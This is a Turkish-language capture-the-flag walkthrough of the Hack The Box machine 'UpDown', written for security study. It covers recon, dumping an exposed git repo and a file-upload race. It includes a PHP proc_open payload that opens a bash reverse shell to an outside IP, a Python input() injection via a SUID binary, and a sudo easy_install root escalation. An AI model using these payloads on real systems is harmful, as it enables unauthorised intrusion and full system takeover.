---
title: 🟠 HTB - UpDown
author: Acivik
date: 2023-01-21 18:00:00 +0300 
categories: [CTF, Hack The Box]
tags: [hackthebox, ctf, hacking, writeup, updown, walktrough, medium, linux]
---

---

| Name | UpDown | ![https://www.hackthebox.com/storage/avatars/d7a56d5f25100d0a918b90de80122f82_thumb.png](https://www.hackthebox.com/storage/avatars/d7a56d5f25100d0a918b90de80122f82_thumb.png) |
| :--- | :---: | :---: |
| Difficulty | Medium | ![https://i.ibb.co/V3pM1r3/image.png](https://i.ibb.co/V3pM1r3/image.png) |
| OS | Linux | ![https://img.icons8.com/color/2x/linux--v2.png](https://img.icons8.com/color/2x/linux--v2.png) |
| Graph | ![https://i.ibb.co/5hp4dbw/image.png](https://i.ibb.co/5hp4dbw/image.png) |
| ![https://i.ibb.co/6r2KsG8/image.png](https://i.ibb.co/6r2KsG8/image.png) | 51 mins, 34 seconds | ![https://www.hackthebox.com/badge/image/114435](https://www.hackthebox.com/badge/image/114435) |
| ![https://i.ibb.co/xXMxxWg/image.png](https://i.ibb.co/xXMxxWg/image.png) | 53 mins, 25 seconds | ![https://www.hackthebox.com/badge/image/114435](https://www.hackthebox.com/badge/image/114435) |
| Machine Maker | | ![https://www.hackthebox.com/badge/image/1303](https://www.hackthebox.com/badge/image/1303) |

---

# <span style="color:#AA0E1C"><b># Reconnaissance</b></span>

## <span style="color:#0096FF">Nmap</span>

`nmap` taraması 22 ssh ve 80 http portlarının açık olduğunu gösterir.

```bash
root@acivik:~/ctfs/UpDown# nmap -p- 10.10.11.177 --min-rate 5000
Starting Nmap 7.93 ( https://nmap.org ) at 2022-12-20 06:30 EST
Nmap scan report for 10.10.11.177
Host is up (0.063s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 19.47 seconds
root@acivik:~/ctfs/UpDown# nmap -p22,80 10.10.11.177 -sV -sC -oN tcp_scan
Starting Nmap 7.93 ( https://nmap.org ) at 2022-12-20 06:33 EST
Nmap scan report for 10.10.11.177
Host is up (0.057s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 9e1f98d7c8ba61dbf149669d701702e7 (RSA)
|   256 c21cfe1152e3d7e5f759186b68453f62 (ECDSA)
|_  256 5f6e12670a66e8e2b761bec4143ad38e (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Is my Website up ?
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 10.58 seconds
root@acivik:~/ctfs/UpDown#
```
[OpenSSH](https://packages.ubuntu.com/search?keywords=openssh-server) versiyonuna göre muhtemelen üzerinde Ubuntu Focal 20.04 çalışıyor.

## <span style="color:#0096FF">VirtualHost Scan</span>

![https://i.ibb.co/crhx8BL/mainpage-png.png](https://i.ibb.co/crhx8BL/mainpage-png.png)

Web sitesine göz atıldığında görünen domain adını `/etc/hosts` dosyasına kaydettik. Şimdi vhost taraması yapabiliriz.

```bash
 root@acivik:~/ctfs/UpDown# ffuf -w /usr/share/seclists/Discovery/DNS/namelist.txt -u http://siteisup.htb -H "Host: FUZZ.siteisup.htb" -mc all -fs 1131

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v1.5.0 Kali Exclusive <3
________________________________________________

 :: Method           : GET
 :: URL              : http://siteisup.htb
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/DNS/namelist.txt
 :: Header           : Host: FUZZ.siteisup.htb
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: all
 :: Filter           : Response size: 1131
________________________________________________

dev                     [Status: 403, Size: 281, Words: 20, Lines: 10, Duration: 67ms]
```

 `siteisup.htb` ve `dev.siteisup.htb` olmak üzere iki adet adres elde ettik. Enumeration aşamasına geçebiliriz.

# <span style="color:#AA0E1C"><b># Enumeration</b></span>

## <span style="color:#0096FF">WebSitesi - 80/tcp - siteisup.htb</span>

### <span style="color:#FFC300">Directory Brute Force</span>

```bash
root@acivik:~/ctfs/UpDown# feroxbuster -u http://siteisup.htb/ -w /usr/share/seclists/Discovery/Web-Content/big.txt

 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.7.2
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://siteisup.htb/
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/big.txt
 👌  Status Codes          │ [200, 204, 301, 302, 307, 308, 401, 403, 405, 500]
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.7.2
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 🏁  HTTP methods          │ [GET]
 🔃  Recursion Depth       │ 4
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
200      GET       40l       93w     1131c http://siteisup.htb/
403      GET        9l       28w      277c http://siteisup.htb/.htpasswd
403      GET        9l       28w      277c http://siteisup.htb/.htaccess
301      GET        9l       28w      310c http://siteisup.htb/dev => http://siteisup.htb/dev/
403      GET        9l       28w      277c http://siteisup.htb/dev/.htaccess
403      GET        9l       28w      277c http://siteisup.htb/dev/.htpasswd
301      GET        9l       28w      315c http://siteisup.htb/dev/.git => http://siteisup.htb/dev/.git/
403      GET        9l       28w      277c http://siteisup.htb/server-status
[####################] - 41s    61431/61431   0s      found:8       errors:3      
[####################] - 31s    20477/20477   647/s   http://siteisup.htb/ 
[####################] - 32s    20477/20477   632/s   http://siteisup.htb/dev/ 
[####################] - 0s     20477/20477   0/s     http://siteisup.htb/dev/.git/ => Directory listing (add -e to scan)
```

`/dev` dizini altında `.git` yani bir repo bulundu. `git-dumper` ile dosyaları dump edebiliriz.

```bash
root@acivik:~/ctfs/UpDown# git-dumper http://siteisup.htb/dev/ repo
[-] Testing http://siteisup.htb/dev/.git/HEAD [200]
[-] Testing http://siteisup.htb/dev/.git/ [200]
[-] Fetching .git recursively
[-] Fetching http://siteisup.htb/dev/.git/ [200]
[-] Fetching http://siteisup.htb/dev/.gitignore [404]
[-] http://siteisup.htb/dev/.gitignore responded with status code 404
[-] Fetching http://siteisup.htb/dev/.git/branches/ [200]
[-] Fetching http://siteisup.htb/dev/.git/objects/ [200]
[-] Fetching http://siteisup.htb/dev/.git/config [200]
[-] Fetching http://siteisup.htb/dev/.git/objects/info/ [200]
[-] Fetching http://siteisup.htb/dev/.git/description [200]
[-] Fetching http://siteisup.htb/dev/.git/refs/ [200]
[-] Fetching http://siteisup.htb/dev/.git/packed-refs [200]
[-] Fetching http://siteisup.htb/dev/.git/info/ [200]
[-] Fetching http://siteisup.htb/dev/.git/hooks/ [200]
[-] Fetching http://siteisup.htb/dev/.git/objects/pack/ [200]
[-] Fetching http://siteisup.htb/dev/.git/index [200]
[-] Fetching http://siteisup.htb/dev/.git/refs/remotes/ [200]
[-] Fetching http://siteisup.htb/dev/.git/refs/tags/ [200]
[-] Fetching http://siteisup.htb/dev/.git/HEAD [200]
[-] Fetching http://siteisup.htb/dev/.git/refs/heads/ [200]
[-] Fetching http://siteisup.htb/dev/.git/logs/ [200]
[-] Fetching http://siteisup.htb/dev/.git/objects/pack/pack-30e4e40cb7b0c696d1ce3a83a6725267d45715da.pack [200]
[-] Fetching http://siteisup.htb/dev/.git/refs/remotes/origin/ [200]
[-] Fetching http://siteisup.htb/dev/.git/refs/heads/main [200]
[-] Fetching http://siteisup.htb/dev/.git/objects/pack/pack-30e4e40cb7b0c696d1ce3a83a6725267d45715da.idx [200]
[-] Fetching http://siteisup.htb/dev/.git/info/exclude [200]
[-] Fetching http://siteisup.htb/dev/.git/logs/refs/ [200]
[-] Fetching http://siteisup.htb/dev/.git/logs/HEAD [200]
[-] Fetching http://siteisup.htb/dev/.git/hooks/applypatch-msg.sample [200]
[-] Fetching http://siteisup.htb/dev/.git/hooks/fsmonitor-watchman.sample [200]
[-] Fetching http://siteisup.htb/dev/.git/hooks/pre-applypatch.sample [200]
[-] Fetching http://siteisup.htb/dev/.git/hooks/post-update.sample [200]
[-] Fetching http://siteisup.htb/dev/.git/hooks/commit-msg.sample [200]
[-] Fetching http://siteisup.htb/dev/.git/hooks/pre-commit.sample [200]
[-] Fetching http://siteisup.htb/dev/.git/hooks/pre-merge-commit.sample [200]
[-] Fetching http://siteisup.htb/dev/.git/hooks/pre-push.sample [200]
[-] Fetching http://siteisup.htb/dev/.git/hooks/pre-rebase.sample [200]
[-] Fetching http://siteisup.htb/dev/.git/hooks/pre-receive.sample [200]
[-] Fetching http://siteisup.htb/dev/.git/hooks/update.sample [200]
[-] Fetching http://siteisup.htb/dev/.git/hooks/push-to-checkout.sample [200]
[-] Fetching http://siteisup.htb/dev/.git/hooks/prepare-commit-msg.sample [200]
[-] Fetching http://siteisup.htb/dev/.git/logs/refs/heads/ [200]
[-] Fetching http://siteisup.htb/dev/.git/refs/remotes/origin/HEAD [200]
[-] Fetching http://siteisup.htb/dev/.git/logs/refs/remotes/ [200]
[-] Fetching http://siteisup.htb/dev/.git/logs/refs/heads/main [200]
[-] Fetching http://siteisup.htb/dev/.git/logs/refs/remotes/origin/ [200]
[-] Fetching http://siteisup.htb/dev/.git/logs/refs/remotes/origin/HEAD [200]
[-] Running git checkout .
Updated 6 paths from the index
root@acivik:~/ctfs/UpDown#
```

Dump işlemi tamamlandı.

```bash
root@acivik:~/ctfs/UpDown/repo# ls -la
total 40
drwxr-xr-x 3 root root 4096 Dec 20 06:51 .
drwxr-xr-x 3 root root 4096 Dec 20 06:51 ..
-rw-r--r-- 1 root root   59 Dec 20 06:51 admin.php
-rw-r--r-- 1 root root  147 Dec 20 06:51 changelog.txt
-rw-r--r-- 1 root root 3145 Dec 20 06:51 checker.php
drwxr-xr-x 7 root root 4096 Dec 20 06:51 .git
-rw-r--r-- 1 root root  117 Dec 20 06:51 .htaccess
-rw-r--r-- 1 root root  273 Dec 20 06:51 index.php
-rw-r--r-- 1 root root 5531 Dec 20 06:51 stylesheet.css
root@acivik:~/ctfs/UpDown/repo#
```

`git log` ve `git diff` komutları ile dosyalarda yapılan değişimleri görebiliriz. 

```bash
root@acivik:~/ctfs/UpDown/repo# git log
commit 010dcc30cc1e89344e2bdbd3064f61c772d89a34 (HEAD -> main, origin/main, origin/HEAD)
Author: Abdou.Y <84577967+ab2pentest@users.noreply.github.com>
Date:   Wed Oct 20 19:38:51 2021 +0200

    Delete index.php

commit c8fcc4032487eaf637d41486eb150b7182ecd1f1
Author: Abdou.Y <84577967+ab2pentest@users.noreply.github.com>
Date:   Wed Oct 20 19:38:08 2021 +0200

    Update checker.php

commit f67efd00c10784ae75bd251add3d52af50d7addd
Author: Abdou.Y <84577967+ab2pentest@users.noreply.github.com>
Date:   Wed Oct 20 18:33:11 2021 +0200

    Create checker.php

commit ab9bc164b4103de3c12ac97152e6d63040d5c4c6
Author: Abdou.Y <84577967+ab2pentest@users.noreply.github.com>
Date:   Wed Oct 20 18:30:58 2021 +0200

    Update changelog.txt

commit 60d2b3280d5356fe0698561e8ef8991825fec6cb
Author: Abdou.Y <84577967+ab2pentest@users.noreply.github.com>
Date:   Wed Oct 20 18:30:39 2021 +0200

    Create admin.php

commit c1998f8fbe683dd0bee8d94167bb896bd926c4c7
Author: Abdou.Y <84577967+ab2pentest@users.noreply.github.com>
Date:   Wed Oct 20 18:29:45 2021 +0200

    Add admin panel.

commit 35a380176ff228067def9c2ecc52ccfe705de640
Author: Abdou.Y <84577967+ab2pentest@users.noreply.github.com>
Date:   Wed Oct 20 17:40:49 2021 +0200

    Update changelog.txt

commit 57af03ba60cdcfe443e92c33c188c6cecb70eb10
Author: Abdou.Y <84577967+ab2pentest@users.noreply.github.com>
Date:   Wed Oct 20 17:29:42 2021 +0200

    Create index.php

commit 354fe069f6205af09f26c99cfe2457dea3eb6a6c
Author: Abdou.Y <84577967+ab2pentest@users.noreply.github.com>
Date:   Wed Oct 20 17:28:48 2021 +0200

    Delete .htpasswd

commit 8812785e31c879261050e72e20f298ae8c43b565
Author: Abdou.Y <84577967+ab2pentest@users.noreply.github.com>
Date:   Wed Oct 20 16:38:54 2021 +0200

    New technique in header to protect our dev vhost.

commit bc4ba79e596e9fd98f1b2837b9bd3548d04fe7ab
Author: Abdou.Y <84577967+ab2pentest@users.noreply.github.com>
Date:   Wed Oct 20 16:37:20 2021 +0200

    Update .htaccess
    
    New technique in header to protect our dev vhost.

commit 61e5cc0550d44c08b6c316d4f04d3fcc7783ae71
Author: Abdou.Y <84577967+ab2pentest@users.noreply.github.com>
Date:   Wed Oct 20 15:45:48 2021 +0200

    Update index.php

commit 3d66cd48933b35f4012066bcc7ee8d60f0069926
Author: Abdou.Y <84577967+ab2pentest@users.noreply.github.com>
Date:   Wed Oct 20 15:45:18 2021 +0200

    Create changelog.txt

commit 4fb192727c29c158a659911aadcdcc23e4decec5
Author: Abdou.Y <84577967+ab2pentest@users.noreply.github.com>
Date:   Wed Oct 20 15:28:26 2021 +0200

    Create stylesheet.css

commit 6f89af70fd23819664dd28d764f13efc02ecfd88
Author: Abdou.Y <84577967+ab2pentest@users.noreply.github.com>
Date:   Wed Oct 20 15:05:40 2021 +0200

    Create index.php

commit 8d1beb1cf5a1327c4cdb271b8efb1599b1b1c87f
Author: Abdou.Y <84577967+ab2pentest@users.noreply.github.com>
Date:   Wed Oct 20 15:05:08 2021 +0200

    Create .htpasswd

commit 6ddcc7a8ac393edb7764788c0cbc13a7a521d372
Author: Abdou.Y <84577967+ab2pentest@users.noreply.github.com>
Date:   Wed Oct 20 15:04:38 2021 +0200

    Create .htaccess
root@acivik:~/ctfs/UpDown/repo#
```

```bash
root@acivik:~/ctfs/UpDown/repo# git diff 6ddcc7a8ac393edb7764788c0cbc13a7a521d372
diff --git a/.htaccess b/.htaccess
index 3190432..b317ab5 100644
--- a/.htaccess
+++ b/.htaccess
@@ -1,5 +1,5 @@
-AuthType Basic
-AuthUserFile /var/www/dev/.htpasswd
-AuthName "Remote Access Denied"
-Require ip 127.0.0.1 ::1
-Require valid-user
+SetEnvIfNoCase Special-Dev "only4dev" Required-Header
+Order Deny,Allow
+Deny from All
+Allow from env=Required-Header
```

`dev.siteisup.htb` adresinde access denied yanıtı alıyorduk. Sebebi ise belirtilen request headerına sahip olmamamız.

## <span style="color:#0096FF">WebSitesi - 80/tcp - dev.siteisup.htb</span>

Artık biliyoruz ki bu headerı burp suite ile ekleyerek sayfayı görüntüleyebiliriz.

![https://i.ibb.co/xgRGx0S/burp.png](https://i.ibb.co/xgRGx0S/burp.png)

burp suite bizim için bunu kolayca yapacak.

![https://i.ibb.co/XSCwbBL/admin.png](https://i.ibb.co/XSCwbBL/admin.png)

Sayfanın kaynak kodları elimizde bulunuyor. Onları incelemeye devam ediyorum.

```php
if($_POST['check']){
  
	# File size must be less than 10kb.
	if ($_FILES['file']['size'] > 10000) {
        die("File too large!");
    }
	$file = $_FILES['file']['name'];
	
	# Check if extension is allowed.
	$ext = getExtension($file);
	if(preg_match("/php|php[0-9]|html|py|pl|phtml|zip|rar|gz|gzip|tar/i",$ext)){
		die("Extension not allowed!");
	}
  
	# Create directory to upload our file.
	$dir = "uploads/".md5(time())."/";
	if(!is_dir($dir)){
        mkdir($dir, 0770, true);
    }
  
  # Upload the file.
	$final_path = $dir.$file;
	move_uploaded_file($_FILES['file']['tmp_name'], "{$final_path}");
	
  # Read the uploaded file.
	$websites = explode("\n",file_get_contents($final_path));
	
	foreach($websites as $site){
		$site=trim($site);
		if(!preg_match("#file://#i",$site) && !preg_match("#data://#i",$site) && !preg_match("#ftp://#i",$site)){
			$check=isitup($site);
			if($check){
				echo "<center>{$site}<br><font color='green'>is up ^_^</font></center>";
			}else{
				echo "<center>{$site}<br><font color='red'>seems to be down :(</font></center>";
			}	
		}else{
			echo "<center><font color='red'>Hacking attempt was detected !</font></center>";
		}
	}
	
  # Delete the uploaded file.
	@unlink($final_path);
} bu
```

Bir dosya yükleme kısmı var ve dosyanın boyutu, uzantısı kontrol ediliyor. Dosya uzantısı olarak `.phar` yasaklanmamış. Yani php kodları upload edebiliriz.

Koda bakmaya devam ettiğimde `uploads/` dizini altında bir md5 klasör oluşturuluyor ve içerisine dosyamız yükleniyor. Sonrasında dosya içindeki url’ler kontrol ediliyor çalışıyorsa `is up` çalışmıyorsa `is down` yanıtı veriyor ve ardından dosyayı siliyor.

Dosya silme süresini uzatmak için dosyanın içerisine oldukça fazla url ekliyorum ve en sonuna da php kodunu yerleştiriyorum.

```
http://google.com
http://google.com
[...]
http://google.com
http://google.com

<?php phpinfo();?>
```

Dosyanın oluşturulduğu yere gidelim.

![https://i.ibb.co/qg59yK6/uploadss.png](https://i.ibb.co/qg59yK6/uploadss.png)

yaşattığımız gecikmeden dolayı dosyanın hâla silinmediğini görüyoruz.

# <span style="color:#AA0E1C"><b># FootHold: Shell as www-data</b></span>

![https://i.ibb.co/KLp7KKv/phpinfo.png](https://i.ibb.co/KLp7KKv/phpinfo.png)

phpinfo sayfasını görüntüleyebiliyorum. Burada incelediğim şey `disable_functions` altındaki fonksiyonlardır. Neredeyse komut çalıştırmak için kullanabileceklerimizin hepsi disable edilmiş gibi duruyor. `proc_open` hariç.

[proc_open](https://www.php.net/manual/tr/function.proc-open.php)

```
http://google.com
http://google.com
[...]
http://google.com
http://google.com

<?php
$descriptorspec = array(
   0 => array("pipe", "r"),  // stdin is a pipe that the child will read from
   1 => array("pipe", "w"),  // stdout is a pipe that the child will write to
   2 => array("file", "/tmp/error-output.txt", "a") // stderr is a file to write to
);

$cwd = '/tmp';
$env = array('some_option' => 'aeiou');

$process = proc_open('sh', $descriptorspec, $pipes, $cwd, $env);

if (is_resource($process)) {
    // Any error output will be appended to /tmp/error-output.txt
    fwrite($pipes[0], "bash -c 'exec bash -i &>/dev/tcp/10.10.14.178/1010 <&1'");
    fclose($pipes[0]);
    echo stream_get_contents($pipes[1]);
    fclose($pipes[1]);
    $return_value = proc_close($process);
    echo "command returned $return_value\n";
}
?>
```

Tekrar bu dosyayı upload ediyorum ve web sitesi üzerinden tetikliyorum. ve shell…

```bash
root@acivik:~/ctfs/UpDown# nc -lnvp 1010
Ncat: Version 7.93 ( https://nmap.org/ncat )
Ncat: Listening on :::1010
Ncat: Listening on 0.0.0.0:1010
Ncat: Connection from 10.10.11.177.
Ncat: Connection from 10.10.11.177:38180.
bash: cannot set terminal process group (909): Inappropriate ioctl for device
bash: no job control in this shell
www-data@updown:/tmp$
```

# <span style="color:#AA0E1C"><b># PrivEsc: www-data → developer</b></span>

home dizini altında `developer` kullanıcısını görüyorum ve içerisinde `dev` klasörü.

```bash
www-data@updown:/home/developer/dev$ ls -la
ls -la
total 32
drwxr-x--- 2 developer www-data   4096 Jun 22 15:45 .
drwxr-xr-x 6 developer developer  4096 Aug 30 11:24 ..
-rwsr-x--- 1 developer www-data  16928 Jun 22 15:45 siteisup
-rwxr-x--- 1 developer www-data    154 Jun 22 15:45 siteisup_test.py

www-data@updown:/home/developer/dev$ cat siteisup_test.py
cat siteisup_test.py
import requests

url = input("Enter URL here:")
page = requests.get(url)
if page.status_code == 200:
	print "Website is up"
else:
	print "Website is down"
www-data@updown:/home/developer/dev$
```

Suid bitine sahip çalıştırılabilir bir dosya bulunuyor. Suid biti dosyanın sahibi kimse onun yetkilerinde çalıştırmamıza yarar. 

Python dosyasına baktığımızda da kullanıcıdan input aldığını ve request gönderdiğini görüyoruz.

Bu noktada input() fonksiyonu bizim işimize yarıyor. Bu sayede komut çalıştırmayı deneyebiliriz.

```bash
www-data@updown:/home/developer/dev$ ./siteisup
./siteisup
Welcome to 'siteisup.htb' application

Enter URL here:__import__('os').system('id')
__import__('os').system('id')
uid=1002(developer) gid=33(www-data) groups=33(www-data)
Traceback (most recent call last):
  File "/home/developer/dev/siteisup_test.py", line 4, in <module>
[...]
```

developer kullanısına bash ile geçiş yapalım.

```bash
www-data@updown:/home/developer/dev$ ./siteisup
./siteisup
Welcome to 'siteisup.htb' application

Enter URL here:__import__('os').system('/bin/bash -i')
__import__('os').system('/bin/bash -i')
developer@updown:/home/developer/dev$ whoami
whoami
developer
developer@updown:/home/developer/dev$
```

# <span style="color:#AA0E1C"><b># PrivEsc: developer → root</b></span>

```bash
developer@updown:/home/developer$ sudo -l
sudo -l
Matching Defaults entries for developer on localhost:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User developer may run the following commands on localhost:
    (ALL) NOPASSWD: /usr/local/bin/easy_install
developer@updown:/home/developer$
```

sudo ile easy_install dosyasını çalıştırabildiğimizi görüyorum.

[https://gtfobins.github.io/gtfobins/easy_install/](https://gtfobins.github.io/gtfobins/easy_install/)

```bash
developer@updown:/home/developer$ TF=$(mktemp -d)
developer@updown:/home/developer$ echo "import os; os.execl('/bin/sh', 'sh', '-c', 'sh <$(tty) >$(tty) 2>$(tty)')" > $TF/setup.py
developer@updown:/home/developer$ sudo easy_install $TF
# whoami
whoami
root
# id
id
uid=0(root) gid=0(root) groups=0(root)
#
```
